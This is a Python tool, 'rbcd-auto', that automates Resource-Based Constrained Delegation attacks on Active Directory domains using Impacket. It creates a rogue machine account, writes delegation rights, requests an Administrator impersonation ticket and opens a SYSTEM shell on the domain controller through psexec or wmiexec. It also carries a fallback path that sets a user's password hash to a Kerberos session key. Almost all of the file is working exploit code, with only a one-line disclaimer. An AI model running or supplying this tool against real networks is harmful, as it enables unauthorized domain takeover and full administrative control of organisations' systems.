#!/usr/bin/env python3
"""
rbcd-auto: Automated RBCD Exploitation Tool for Active Directory
Author: Ryan McCutcheon
License: MIT

This tool automates Resource-Based Constrained Delegation (RBCD) attacks 
from Linux using Impacket. It supports both standard machine account creation 
(attacks leveraging ms-DS-MachineAccountQuota > 0) and Forshaw’s fallback method 
for environments where MAQ is set to 0.

Features:
- Automates machine account creation and RBCD delegation
- Supports fallback to Forshaw's technique using TGT + NT hash
- Dynamically sets Kerberos tickets via KRB5CCNAME
- Drops SYSTEM shell using Impacket's psexec.py or wmiexec.py
- Compatible with HTB labs, real-world networks, and red team ops

Usage Examples:

# Standard RBCD (MAQ > 0):
python3 rbcd_auto.py \
  --dc-ip <DC_IP> \
  --dc-name <FQDN> \
  --domain <domain> \
  --username <username> \
  --password <password>

# Forshaw fallback (MAQ = 0, using owned user):
python3 rbcd_auto.py \
  --dc-ip <DC_IP> \
  --dc-name <FQDN> \
  --domain <domain> \
  --username <username> \
  --password <password> \
  --target-spn <SPN> \
  --fallback

Disclaimer:
For educational and authorized security testing purposes only.
"""

import argparse
import subprocess
import random
import string
import os
import sys
import glob
import time
import hashlib


def random_machine_account():
    name = ''.join(random.choices(string.ascii_uppercase, k=8)) + '$'
    password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#%_+-=", k=16))
    return name, password


def run_cmd(command):
    print(f"[+] Running: {' '.join(command)}")
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(result.stdout)
    if result.stderr:
        print(result.stderr)
    return result.returncode == 0


def create_computer(dc_ip, full_user, computer_name, computer_pass):
    return run_cmd([
        'addcomputer.py',
        '-computer-name', computer_name,
        '-computer-pass', computer_pass,
        '-dc-ip', dc_ip,
        full_user
    ])


def delegate_to_computer(dc_ip, target_computer_with_dollar, new_computer_name_with_dollar, full_user):
    return run_cmd([
        'rbcd.py',
        '-dc-ip', dc_ip,
        '-delegate-to', target_computer_with_dollar,
        '-delegate-from', new_computer_name_with_dollar,
        full_user,
        '-action', 'write'
    ])


def get_ticket(dc_ip, fqdn, computer_name, computer_pass, domain):
    return run_cmd([
        'getST.py',
        '-spn', f'cifs/{fqdn}',
        '-impersonate', 'Administrator',
        '-dc-ip', dc_ip,
        f'{domain}/{computer_name}:{computer_pass}'
    ])


def export_ticket():
    ccache_files = glob.glob("*.ccache")
    if not ccache_files:
        print("[-] No .ccache ticket found.")
        return False

    ccache_files.sort(key=os.path.getmtime, reverse=True)
    chosen_ticket = ccache_files[0]

    ticket_path = os.path.abspath(chosen_ticket)
    os.environ['KRB5CCNAME'] = ticket_path
    print(f"[+] Set KRB5CCNAME={ticket_path}")
    return True


def run_psexec(fqdn):
    print("[+] Dropping into psexec.py SYSTEM shell...")
    os.execvp("psexec.py", ["psexec.py", "-k", "-no-pass", fqdn])


def ntlm_hash(password):
    return hashlib.new('md4', password.encode('utf-16le')).hexdigest()


def forshaw_rbcd(args):
    tgt_filename = f"{args.username}.ccache"

    # Use given or derived NT hash
    hash_to_use = args.nt_hash or ntlm_hash(args.password)
    print(f"[+] Using NT hash: {hash_to_use}")

    # Step 1: getTGT
    run_cmd([
        'getTGT.py',
        f"{args.domain}/{args.username}",
        '-hashes', f":{hash_to_use}",
        '-dc-ip', args.dc_ip
    ])

    # Step 2: extract session key
    result = subprocess.run(['describeTicket.py', tgt_filename], capture_output=True, text=True)
    session_key = None
    for line in result.stdout.splitlines():
        if 'Ticket Session Key' in line:
            session_key = line.split(':')[-1].strip()
            break
    if not session_key:
        print("[-] Failed to extract session key.")
        sys.exit(1)
    print(f"[+] Session key: {session_key}")

    # Step 3: changepasswd
    run_cmd([
        'changepasswd.py',
        f"{args.domain}/{args.username}@{args.dc_ip}",
        '-hashes', f":{hash_to_use}",
        '-newhash', f":{session_key}"
    ])

    # Step 4: getST with impersonation
    print("[*] Requesting S4U2Proxy impersonation ticket...")
    os.environ['KRB5CCNAME'] = os.path.abspath(tgt_filename)
    run_cmd([
        'getST.py',
        '-u2u',
        '-impersonate', 'Administrator',
        '-spn', args.target_spn,
        '-no-pass',
        f"{args.domain}/{args.username}",
        '-dc-ip', args.dc_ip
    ])

    print("[+] Impersonation ticket saved.")
    export_ticket()
    run_cmd(['wmiexec.py', '-k', '-no-pass', args.dc_name])


def main():
    parser = argparse.ArgumentParser(description="Automated RBCD Exploit (with fallback to Forshaw) using Impacket.")
    parser.add_argument('--dc-ip', required=True, help='Domain Controller IP')
    parser.add_argument('--dc-name', required=True, help='DC FQDN (e.g., dc01.inlanefreight.local)')
    parser.add_argument('--domain', required=True, help='AD domain name')
    parser.add_argument('--username', required=True, help='Username with RBCD rights')
    parser.add_argument('--password', required=True, help='Password for user')

    # Fallback mode (Forshaw)
    parser.add_argument('--fallback', action='store_true', help='Enable Forshaw fallback path if MAQ=0')
    parser.add_argument('--nt-hash', help='NT hash (optional if fallback enabled)')
    parser.add_argument('--target-spn', help='Target SPN (e.g., TERMSRV/dc01.inlanefreight.local)')

    args = parser.parse_args()
    full_user = f"{args.domain}/{args.username}:{args.password}"

    # Try machine account path first
    machine_name, machine_pass = random_machine_account()
    machine_name_no_dollar = machine_name.rstrip('$')
    machine_name_with_dollar = machine_name
    target_computer_short = args.dc_name.split('.')[0] + '$'

    print(f"[+] Generated machine account: {machine_name}")
    print(f"[+] Generated password: {machine_pass}")

    print("[*] Step 1: Creating computer account...")
    if not create_computer(args.dc_ip, full_user, machine_name, machine_pass):
        print("[-] MAQ likely set to 0. Cannot create machine account.")
        if args.fallback and args.target_spn:
            print("[*] Switching to Forshaw RBCD method...")
            forshaw_rbcd(args)
            return
        else:
            print("[-] Use --fallback and --target-spn to try Forshaw method.")
            sys.exit(1)

    print("[*] Step 2: Delegating new machine account to target...")
    if not delegate_to_computer(args.dc_ip, target_computer_short, machine_name_with_dollar, full_user):
        print("[-] Failed to set RBCD.")
        sys.exit(1)

    print("[*] Step 3: Requesting TGS as Administrator...")
    if not get_ticket(args.dc_ip, args.dc_name, machine_name_no_dollar, machine_pass, args.domain):
        print("[-] Failed to retrieve TGS.")
        sys.exit(1)

    print("[*] Step 4: Setting KRB5CCNAME...")
    if not export_ticket():
        sys.exit(1)

    print("[*] Step 5: Launching psexec.py as Administrator...")
    run_psexec(args.dc_name)


if __name__ == '__main__':
    main()
